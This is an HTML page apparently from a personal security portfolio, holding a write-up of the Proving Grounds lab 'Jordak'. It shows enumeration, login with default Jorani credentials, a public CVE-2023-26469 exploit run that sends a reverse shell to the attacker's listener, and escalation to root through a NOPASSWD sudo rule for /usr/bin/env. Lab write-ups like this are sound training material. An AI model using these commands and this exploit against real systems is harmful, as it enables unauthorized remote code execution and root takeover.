@@ -1,0 +1,135 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="description" content="This lab involves exploiting CVE-2023-26469 in Jorani v1.0.0 to achieve Remote Code Execution (RCE). Privilege escalation is achieved through a misconfigured sudo permission for /usr/bin/env, leading to root access."><title>Proving Grounds: Jordak</title><style>
+  :root { --muted:#9aa4b2; --accent:#facc15; --text:#e6eef6; --mono:ui-monospace,SFMono-Regular,Menlo,Monaco,"Roboto Mono","Courier New",monospace; --maxw:900px; }
+  * { box-sizing:border-box; } html { scroll-behavior:smooth; }
+  body { margin:0; background:linear-gradient(180deg,#071021 0%,#0f1724 50%); color:var(--text); font-family:Inter,"Segoe UI",Roboto,system-ui,-apple-system,sans-serif; -webkit-font-smoothing:antialiased; line-height:1.6; }
+  .wrap { max-width:var(--maxw); margin:40px auto; padding:28px; background:linear-gradient(180deg,rgba(255,255,255,.02),rgba(255,255,255,.01)); border:1px solid rgba(255,255,255,.03); border-radius:12px; box-shadow:0 6px 30px rgba(2,6,23,.6); }
+  .site-header { display:flex; align-items:center; justify-content:space-between; gap:16px; padding-bottom:18px; margin-bottom:24px; border-bottom:1px solid rgba(255,255,255,.06); }
+  .site-brand { color:var(--accent); font-weight:750; letter-spacing:.02em; text-decoration:none; } .site-brand:hover,.site-link:hover { color:#ffe57a; } .site-link { color:var(--muted); font-size:13px; text-decoration:none; } .back-button { padding:7px 11px; border:1px solid rgba(250,204,21,.24); border-radius:7px; background:rgba(250,204,21,.08); color:var(--accent); font-weight:650; }
+  .target-tag { display:inline-block; margin-bottom:12px; padding:5px 10px; border:1px solid rgba(250,204,21,.24); border-radius:999px; color:var(--accent); background:rgba(250,204,21,.1); font-size:12px; font-weight:700; letter-spacing:.08em; text-transform:uppercase; }
+  header h1 { margin:0; font-size:28px; letter-spacing:-.2px; line-height:1.25; } header p { margin:8px 0 0; color:var(--muted); font-size:14px; }
+  .meta { display:flex; flex-wrap:wrap; gap:12px; align-items:center; margin-top:18px; color:var(--muted); font-size:13px; } .badge { background:rgba(250,204,21,.12); color:var(--accent); padding:6px 10px; border-radius:999px; font-weight:600; font-size:13px; }
+  nav.toc { margin-top:22px; padding:14px; background:rgba(255,255,255,.02); border:1px solid rgba(255,255,255,.02); border-radius:8px; } nav.toc ul { display:flex; flex-wrap:wrap; gap:10px; margin:0; padding:0; list-style:none; } nav.toc a { color:var(--muted); text-decoration:none; font-size:13px; } nav.toc a:hover { color:var(--accent); }
+  article { margin-top:28px; } h2 { margin-top:30px; color:var(--accent); font-size:22px; scroll-margin-top:20px; } h3 { margin-top:22px; color:#dfe9f6; font-size:17px; } h4,h5,h6 { color:#dfe9f6; } p,li { overflow-wrap:anywhere; } a { color:var(--accent); } strong { color:#f4f8fc; }
+  blockquote { margin:16px 0; padding:10px 12px; color:var(--muted); background:rgba(250,204,21,.06); border-left:3px solid rgba(250,204,21,.22); border-radius:4px; }
+  .code-brief { margin:18px 0 8px; color:var(--muted); font-size:14px; }
+  pre { margin:12px 0; padding:14px; overflow:auto; color:#dff3ff; background:#041022; border:1px solid rgba(255,255,255,.03); border-radius:8px; box-shadow:0 6px 18px rgba(2,6,23,.5); font:13px/1.55 var(--mono); } code { padding:2px 6px; border-radius:4px; background:rgba(255,255,255,.04); font-family:var(--mono); font-size:.9em; } pre code { padding:0; background:transparent; font-size:inherit; }
+  table { width:100%; margin-top:12px; border-collapse:collapse; } th,td { padding:8px; border-bottom:1px solid rgba(255,255,255,.06); text-align:left; color:var(--muted); font-size:14px; } th { color:#dfe9f6; font-weight:600; } hr { border:0; border-top:1px solid rgba(255,255,255,.08); margin:28px 0; } img { max-width:100%; border-radius:8px; }
+  footer { margin-top:30px; padding-top:12px; border-top:1px solid rgba(255,255,255,.02); color:var(--muted); font-size:13px; text-align:center; }
+  @media (max-width:720px) { .wrap { margin:18px; padding:16px; } header h1 { font-size:20px; } nav.toc ul { flex-direction:column; gap:6px; } }
+</style></head><body><main class="wrap"><div class="site-header"><a class="site-brand" href="index.html">Karan Tank</a><a class="site-link back-button" href="index.html">← Back to index</a></div><header><span class="target-tag">Target: Linux</span><h1>Proving Grounds: Jordak</h1><p>This lab involves exploiting CVE-2023-26469 in Jorani v1.0.0 to achieve Remote Code Execution (RCE). Privilege escalation is achieved through a misconfigured sudo permission for /usr/bin/env, leading to root access.</p><div class="meta"><span class="badge">Proving Grounds</span><span>Authorized lab writeup</span><span>Cybersecurity portfolio</span></div></header><nav class="toc" aria-label="Table of contents"><ul><li><a href="#overview">Overview</a></li><li><a href="#learning-objectives">Learning objectives</a></li><li><a href="#scenario">Scenario</a></li><li><a href="#enumeration">Enumeration</a></li><li><a href="#initial-access">Initial Access</a></li><li><a href="#privilege-escalation">Privilege Escalation</a></li><li><a href="#takeaways">Takeaways</a></li></ul></nav><article><blockquote>
+<p><strong>Authorized-lab note:</strong> This writeup documents activity performed exclusively in an authorized Offensive Security Proving Grounds lab. It is shared for educational and portfolio purposes.</p>
+</blockquote>
+<h2 id="overview">Overview</h2>
+<p>Approaches for identifying potential vulnerabilities are utilized in this lab. The focus is on exploiting CVE-2023-26469, practicing privilege escalation, and abusing SUDO permissions for unauthorized access. This lab emphasizes understanding and exploiting vulnerabilities to enhance security awareness.</p>
+<h2 id="learning-objectives">Learning objectives</h2>
+<p><strong>After completion of this lab, learners will be able to:</strong></p>
+<ul>
+<li>Perform enumeration to identify an Apache web server hosting Jorani v1.0.0 and discover the vulnerable login endpoint.</li>
+<li>Exploit CVE-2023-26469 using a publicly available Proof of Concept to gain a shell as the jordak user.</li>
+<li>Establish a reverse shell for a fully interactive session and retrieve the local user flag.</li>
+<li>Analyze sudo privileges to identify that /usr/bin/env can be run as root without a password.</li>
+<li>Exploit the misconfigured sudo permission to escalate to root using sudo /usr/bin/env /bin/bash and retrieve the final proof flag.</li>
+</ul>
+<h2 id="scenario">Scenario</h2>
+<p>This lab involves exploiting CVE-2023-26469 in Jorani v1.0.0 to achieve Remote Code Execution (RCE). Privilege escalation is achieved through a misconfigured sudo permission for /usr/bin/env, leading to root access.</p>
+<h2 id="enumeration">Enumeration</h2>
+<p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code>(kali㉿kali)-[~/offsec/jordak]
+# Discover application paths and files that may expand the attack surface.
+
+└─$ gobuster dir -u http://192.168.150.109/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 307| grep &#39;301&#39;
+docs                 (Status: 301) [Size: 317] [--&gt; http://192.168.150.109/docs/]
+assets               (Status: 301) [Size: 319] [--&gt; http://192.168.150.109/assets/]
+tests                (Status: 301) [Size: 318] [--&gt; http://192.168.150.109/tests/]
+vendor               (Status: 301) [Size: 319] [--&gt; http://192.168.150.109/vendor/]
+sql                  (Status: 301) [Size: 316] [--&gt; http://192.168.150.109/sql/]</code></pre><h2 id="initial-access">Initial Access</h2>
+<p class="code-brief">This block uses the identified entry point to obtain or validate an initial foothold. The resulting response or session confirms whether access was achieved.</p><pre><code># The scan output identifies the target&#39;s exposed services and their versions.
+
+Nmap scan report for 192.168.150.109
+Host is up (0.022s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 76:18:f1:19:6b:29:db:da:3d:f6:7b:ab:f4:b5:63:e0 (ECDSA)
+|_  256 cb:d8:d6:ef:82:77:8a:25:32:08:dd:91:96:8d:ab:7d (ED25519)
+80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-trane-info: Problem with XML parsing of /evox/about
+|_http-server-header: Apache/2.4.58 (Ubuntu)
+| http-robots.txt: 1 disallowed entry 
+|_/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre><ul>
+<li><p>In the <code>/docs/install/ReadMe</code> we can see that the application is running jorani</p>
+</li>
+<li><p>Searching online we found this payload <a href="https://www.exploit-db.com/exploits/45338">https://www.exploit-db.com/exploits/45338</a></p>
+</li>
+<li><p>trying to access <code>/session</code> it redirects us to login page</p>
+</li>
+<li><p>We are able to login using the default credentials for jorani <code>bbalet:bbalet</code> also found in the readme file</p>
+</li>
+<li><p>Found the version of jorani to be 1.0, and researching it online, we found that the version is vulnerable for RCE</p>
+</li>
+<li><p>we found the github <a href="https://github.com/samipmainali/Jorani-Reverse-Shell-v1.0.0">https://github.com/samipmainali/Jorani-Reverse-Shell-v1.0.0</a></p>
+</li>
+</ul>
+<p class="code-brief">This block uses the identified entry point to obtain or validate an initial foothold. The resulting response or session confirms whether access was achieved.</p><pre><code># Run the helper or analysis script used in this lab step.
+
+└─$ python3 Jorani_V1.0.0_exploit.py -u http://192.168.150.109/ -i 192.168.45.200 -p 1234             
+
+     ██╗ ██████╗ ██████╗  █████╗ ███╗   ██╗██╗
+     ██║██╔═══██╗██╔══██╗██╔══██╗████╗  ██║██║
+     ██║██║   ██║██████╔╝███████║██╔██╗ ██║██║
+██   ██║██║   ██║██╔══██╗██╔══██║██║╚██╗██║██║
+╚█████╔╝╚██████╔╝██║  ██║██║  ██║██║ ╚████║██║
+ ╚════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝
+    
+[ CVE-2023-26469 - Jorani &lt;=1.0.0 RCE Exploit ]
+Credits: @jrjgjk | Modified by: Samip Mainali
+
+[~] Poisoning application logs...
+[~] Triggering exploit...
+[+] Reverse shell connection established!
+[*] Waiting 5 seconds to confirm stability...
+[+] Exploit completed successfully!
+[+] Check your listener for the shell!</code></pre><h2 id="privilege-escalation">Privilege Escalation</h2>
+<p class="code-brief">This block investigates or exercises a privilege-escalation path. The output is used to confirm elevated permissions or the conditions required to obtain them.</p><pre><code>─(kali㉿kali)-[~/offsec/jordak]
+# Execute the next evidence-gathering step in the authorized lab.
+
+└─$ rlwrap nc -nlvp 1234
+listening on [any] 1234 ...
+connect to [192.168.45.200] from (UNKNOWN) [192.168.150.109] 40300
+# Run the helper or analysis script used in this lab step.
+
+python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;
+To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;.
+See &quot;man sudo_root&quot; for details.
+
+# Execute the next evidence-gathering step in the authorized lab.
+
+jordak@jordak:/var/www/html$ id
+id
+uid=1000(jordak) gid=1000(jordak) groups=1000(jordak),27(sudo)</code></pre><p class="code-brief">This block investigates or exercises a privilege-escalation path. The output is used to confirm elevated permissions or the conditions required to obtain them.</p><pre><code># Identify commands that can run with elevated privileges.
+
+jordak@jordak:/var/www/html$ sudo -l
+# Identify commands that can run with elevated privileges.
+
+sudo -l
+Matching Defaults entries for jordak on jordak:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User jordak may run the following commands on jordak:
+    (ALL : ALL) ALL
+    (ALL) NOPASSWD: /usr/bin/env
+# Execute the next evidence-gathering step in the authorized lab.
+
+jordak@jordak:/var/www/html$ sudo env /bin/sh
+# Execute the next evidence-gathering step in the authorized lab.
+
+sudo env /bin/sh
+## id
+id
+uid=0(root) gid=0(root) groups=0(root)</code></pre><h2 id="takeaways">Takeaways</h2>
+<p>This lab reinforced the value of methodical enumeration, evidence-driven hypothesis testing, and validating each access-control boundary in an authorized environment.</p>
+</article><footer>Written by Karan Tank · Documented for educational and portfolio purposes in an authorized lab environment.</footer></main></body></html>
